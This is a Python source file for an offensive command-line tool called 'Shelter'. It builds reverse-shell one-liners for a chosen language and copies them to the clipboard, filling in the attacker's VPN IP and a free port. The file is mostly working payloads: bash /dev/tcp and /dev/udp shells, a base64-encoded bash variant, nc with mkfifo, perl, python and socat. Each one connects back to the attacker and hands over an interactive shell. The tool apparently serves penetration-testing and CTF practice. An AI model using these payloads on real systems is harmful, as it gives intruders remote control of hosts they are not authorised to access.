#!/usr/bin/python3.9

import argparse
from argparse import RawTextHelpFormatter
import pyperclip
import os
import base64
import netifaces
import subprocess

bold = "\033[1m"                                                                    
green = "\033[32m"                  
purple = "\033[95m"
red = "\033[91m"
end = "\033[0m"                                                                                                                                                          
                                                                                    
                                          
                                                                                    
def ap(text) :
    print(f"{bold}{green}\t[+] {end}{text}")
    #print(bold,green,"[+]",end,text)
def ainfo(text) :
    print(f"{bold}{purple}\t[*] {end}{text}")
    #print(bold,purple,"[*]",end,text)
def aerr(text) : 
    print(f"{bold}{red}\t[-] {end}{text}") 
    #print(bold,red,"[-]",end,text)

parser = argparse.ArgumentParser(description="""
   _____ __         ____           
  / ___// /_  ___  / / /____  _____
  \__ \/ __ \/ _ \/ / __/ _ \/ ___/
 ___/ / / / /  __/ / /_/  __/ /    
/____/_/ /_/\___/_/\__/\___/_/     
                                                                      
Version: v1.0.1 - 06/04/21 - Bides Das @Xyan1d3 """,formatter_class=RawTextHelpFormatter)

subparser = parser.add_subparsers(title="Available Modules", dest="module")
rev = subparser.add_parser("rev",help="Revshell to clipboard")
web = subparser.add_parser("web",help="Webshell interactor")
webrev = subparser.add_parser("webrev",help="Webshell to Revshell")
host = subparser.add_parser("host",help="Copies a revershell file in pwd and hosts it and copies the ip to your clipboard")

rev_sub = rev.add_subparsers(title="Available Payloads",dest='sub')
bash = rev_sub.add_parser("bash",help="echo base64_encoded_bash-i_payload |base64 -d|bash")
bashi = rev_sub.add_parser("bashi",help="bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1")
bash196 = rev_sub.add_parser("bash196",help="0<&196;exec 196<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT; bash <&196 >&196 2>&196")
bashrl = rev_sub.add_parser("bashrl",help="exec 5<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT;cat <&5 | while read line; do $line 2>&5 >&5; done")
bash5 = rev_sub.add_parser("bash5",help="bash -i 5<> /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0<&5 1>&5 2>&5")
bashudp = rev_sub.add_parser("bashudp",help="bash -i >& /dev/udp/ATTACKER_IP/ATTACKER_PORT 0>&1")
nc_mkfifo = rev_sub.add_parser("nc_mkfifo",help="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f")
perl = rev_sub.add_parser("perl",help="""perl -e 'use Socket;$i="ATTACKER_IP";$p=ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'""")
py2 = rev_sub.add_parser("py2",help="""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""")
py = rev_sub.add_parser("py",help="""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""")
py2export = rev_sub.add_parser("py2export",help="""export RHOST="ATTACKER_IP";export RPORT=ATTACKER_PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'""")
pyexport = rev_sub.add_parser("pyexport",help="""export RHOST="ATTACKER_IP";export RPORT=ATTACKER_PORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")""")
socat = rev_sub.add_parser("socat",help="socat TCP:ATTACKER_IP:ATTACKER_PORT EXEC:'bash',pty,stderr,setsid,sigint,sane")
#ruby = rev_sub.add_parser("ruby",help="""ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",ATTACKER_PORT).to_i;exec sprintf("bash -i <&'%'d >&'%'d 2>&'%'d",f,f,f)'""")

bash.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
bashi.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
bash196.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
bashrl.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
bash5.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
bashudp.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
nc_mkfifo.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
perl.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
py2.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
py.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
py2export.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
pyexport.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
socat.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")

args = parser.parse_args()

def fetch_ip(): # This function IP of the NIC [default:tun0]
    nic = "tun0"
    if "tun0" not in netifaces.interfaces():
        aerr("No VPN detected...")
        ainfo(f"Enter the Interface you want to listen on from {netifaces.interfaces()}")
        nic = str(input("Interface Name : "))

    ipaddr = []
    for interface in netifaces.interfaces():
        try : 
            for link in netifaces.ifaddresses(interface)[netifaces.AF_INET]:
                ipaddr.append(link['addr'])
        except KeyError:
            ipaddr.append(0)
    ip = ipaddr[netifaces.interfaces().index(nic)]
    if ip == 0 :
        aerr(f"Fatal Error: {nic} has no ip assigned.")
        exit()
    return ip

def fetch_port(): # This function returns a free tcp port for catching reverse shell.
    revshell_ports = [8888,9001,9002,9003,9004,9005,9999,7777,6666,5555,4444]
    for each in revshell_ports:
        op = subprocess.run(['netstat', '-tl'], stdout=subprocess.PIPE).stdout.decode('utf-8')
        if str(each) in op:
            pass
        else:
            return each

def shell_cpy(language,ATTACKER_IP,ATTACKER_PORT): # This function takes attacker ip,attacker port & language og revshell and returns a full fleged reverse-shell
    bashi_b64 = base64.b64encode(f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1".encode()).decode()
    
    payloads = {
    "bash" : f"echo {bashi_b64} |base64 -d|bash",
    "bashi" : f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1",
    "bash196" : f"0<&196;exec 196<>/dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT}; bash <&196 >&196 2>&196",
    "bashrl" : f"exec 5<>/dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT};cat <&5 | while read line; do $line 2>&5 >&5; done",
    "bash5" : f"bash -i 5<> /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0<&5 1>&5 2>&5",
    "bashudp" : f"bash -i >& /dev/udp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1",
    "nc_mkfifo" : f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ATTACKER_IP} {ATTACKER_PORT} >/tmp/f",
    "perl" : """perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'""" % (ATTACKER_IP,ATTACKER_PORT),
    "py2" : f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",{ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""",
    "py" : f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",{ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""",
    "py2export" : f"""export RHOST="{ATTACKER_IP}";export RPORT={ATTACKER_PORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'""",
    "pyexport" : f"""export RHOST="{ATTACKER_IP}";export RPORT={ATTACKER_PORT};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")""",
    "socat" : f"socat TCP:{ATTACKER_IP}:{ATTACKER_PORT} EXEC:'bash',pty,stderr,setsid,sigint,sane"
    }
    if language == "":
        return payloads["bash"]
    return payloads[language]

if args.module == "rev": # Checks for 1st pos arg if its rev.
    if args.sub in list(rev_sub.choices.keys()): # Checks if the 2nd pos arg is valid language for revshell payload.
        pyperclip.copy(shell_cpy(args.sub,fetch_ip(),fetch_port())) # It will take 2nd positional arg as language and copy the revshell in the clipboard.
        #print(shell_cpy(args.sub,"127.0.0.1",8888))
    else:
        pyperclip.copy(shell_cpy("bash",fetch_ip(),fetch_port())) # If 2nd positional arg is not supplied it will fallback to bash base64 encoded revshell.
        #print(shell_cpy("bash","127.0.0.1",8888))
    